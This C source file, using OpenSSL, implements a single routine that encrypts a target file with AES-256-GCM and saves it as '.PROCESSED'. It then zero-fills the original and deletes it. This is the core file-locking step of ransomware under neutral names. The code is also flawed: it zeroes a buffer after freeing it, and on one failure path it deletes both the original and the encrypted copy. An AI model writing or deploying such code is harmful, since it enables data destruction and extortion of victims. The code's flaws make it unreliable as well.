#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <errno.h>

#define NONCE_LEN     12
#define TAG_LEN       16
#define AES256_KEY_LEN 32

static int read_file(const char *path, unsigned char **data, size_t *len) {
    FILE *f = fopen(path, "rb");
    if (!f) return -1;
    if (fseek(f, 0, SEEK_END) != 0) { fclose(f); return -1; }
    long sz = ftell(f);
    if (sz < 0) { fclose(f); return -1; }
    if (fseek(f, 0, SEEK_SET) != 0) { fclose(f); return -1; }
    *data = malloc(sz == 0 ? 1 : (size_t)sz);
    if (!*data) { fclose(f); return -1; }
    size_t nread = fread(*data, 1, (size_t)sz, f);
    fclose(f);
    if (nread != (size_t)sz) { free(*data); return -1; }
    *len = (size_t)sz;
    return 0;
}

static int write_file(const char *path, const unsigned char *nonce,
                      const unsigned char *ciphertext, size_t ciphertext_len,
                      const unsigned char *tag) {
    FILE *f = fopen(path, "wb");
    if (!f) return -1;
    if (fwrite(nonce, 1, NONCE_LEN, f) != NONCE_LEN) { fclose(f); return -1; }
    if (ciphertext_len > 0 &&
        fwrite(ciphertext, 1, ciphertext_len, f) != ciphertext_len) {
        fclose(f); return -1;
    }
    if (fwrite(tag, 1, TAG_LEN, f) != TAG_LEN) { fclose(f); return -1; }
    if (fclose(f) != 0) return -1;
    return 0;
}

static int overwrite_with_zeros(const char *path, size_t size) {
    FILE *f = fopen(path, "wb");
    if (!f) return -1;
    size_t block_size = 4096;
    unsigned char *zeros = calloc(1, block_size);
    if (!zeros) { fclose(f); return -1; }
    int ok = 0;
    size_t remaining = size;
    while (remaining > 0) {
        size_t chunk = remaining > block_size ? block_size : remaining;
        if (fwrite(zeros, 1, chunk, f) != chunk) goto done;
        remaining -= chunk;
    }
    ok = 1;
done:
    free(zeros);
    fclose(f);
    return ok ? 0 : -1;
}

int apply_transform(const char *filepath, const unsigned char *session_key) {
    unsigned char *plaintext = NULL;
    size_t plaintext_len = 0;
    unsigned char nonce[NONCE_LEN];
    unsigned char tag[TAG_LEN];
    unsigned char *ciphertext = NULL;
    int ciphertext_len = 0;
    EVP_CIPHER_CTX *ctx = NULL;
    char *output_path = NULL;
    int ret = -1;

    /* Read original file */
    if (read_file(filepath, &plaintext, &plaintext_len) != 0)
        goto cleanup;

    /* Generate random nonce */
    if (RAND_bytes(nonce, NONCE_LEN) != 1)
        goto cleanup;

    /* Create encryption context */
    ctx = EVP_CIPHER_CTX_new();
    if (!ctx) goto cleanup;

    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, session_key, nonce) != 1)
        goto cleanup;

    /* Allocate ciphertext buffer: plaintext length + 16 (GCM max overhead) */
    int outlen = 0;
    int final_len = 0;
    size_t max_out = plaintext_len + EVP_CIPHER_CTX_block_size(ctx);
    ciphertext = malloc(max_out);
    if (!ciphertext) goto cleanup;

    /* Encrypt plaintext */
    if (EVP_EncryptUpdate(ctx, ciphertext, &outlen, plaintext, plaintext_len) != 1)
        goto cleanup;
    ciphertext_len = outlen;

    /* Finalise encryption (GCM: usually no extra output) */
    if (EVP_EncryptFinal_ex(ctx, ciphertext + outlen, &final_len) != 1)
        goto cleanup;
    ciphertext_len += final_len;

    /* Get authentication tag */
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, TAG_LEN, tag) != 1)
        goto cleanup;

    /* Build output path: original + ".PROCESSED" */
    size_t path_len = strlen(filepath);
    output_path = malloc(path_len + 11); /* ".PROCESSED" = 10 + 1 null */
    if (!output_path) goto cleanup;
    snprintf(output_path, path_len + 11, "%s.PROCESSED", filepath);

    /* Write output file */
    if (write_file(output_path, nonce, ciphertext, (size_t)ciphertext_len, tag) != 0)
        goto cleanup;

    /* Overwrite original with zeros */
    if (overwrite_with_zeros(filepath, plaintext_len) != 0) {
        /* Attempt to remove incomplete output file */
        remove(output_path);
        goto cleanup;
    }

    /* Remove original file */
    if (remove(filepath) != 0) {
        /* If remove fails, we already wrote zeros, but still an error. */
        remove(output_path); /* cleanup output */
        goto cleanup;
    }

    ret = 0;

cleanup:
    free(plaintext);
    free(ciphertext);
    free(output_path);
    if (ctx) EVP_CIPHER_CTX_free(ctx);
    /* Securely clear sensitive data that might remain in memory */
    if (plaintext) {
        volatile unsigned char *p = plaintext;
        size_t i;
        for (i = 0; i < plaintext_len; i++)
            p[i] = 0;
    }
    return ret;
}